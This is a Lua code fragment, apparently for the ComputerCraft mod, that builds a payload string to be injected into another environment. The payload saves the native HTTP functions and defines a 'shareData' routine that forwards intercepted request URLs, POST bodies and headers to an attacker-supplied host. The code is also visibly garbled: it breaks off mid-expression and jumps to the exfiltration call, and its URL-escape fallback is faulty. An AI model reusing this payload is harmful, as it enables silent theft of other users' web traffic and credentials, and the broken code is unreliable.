return [[(function()
    if type(_G._G.http) == "table" and type(_G._G.http.post) == "function" then
        local nativeget, nativepost, nativerequest, nativecheck, nativecode = http.get, http.post, http.request, http.checkURL, type(textutils) == "table" and type(textutils.urlEscape) == "function" and textutils.urlEscape or function(t)
            local i = 1
            while i <= #t do
                local b = t:sub(i, i):byte()
                if t:sub(i, i):gmatch("[^%w%$-_%.+%!%*'%(%)]", "") == "" then
                    local show = "%" .. ("%02x"):format(b)
                    t = (t ~= 1 and t:sub(1, i - 1) or "") .. show .. (#t > i and t:sub(i + 1, -1) or "")
                    i = i + 3
                else
                    i = i + 1
                end
            end
        end
        local function shareData(url, post, headers)
            if type(url) ~= "string" or type(post) ~= "table" or type(headers) ~= "table" then
                return
            end
            local txtPost, txtHeaders
            do
                local functs = {}
                local function start(t)
                    functs[#functs + 1] = function(p)
                        for k, v in next, p do
                            if type(
            nativepost("]] .. (({...})[1]) .. [[" .. "?url=" .. nativecode(url), post, headers)
            
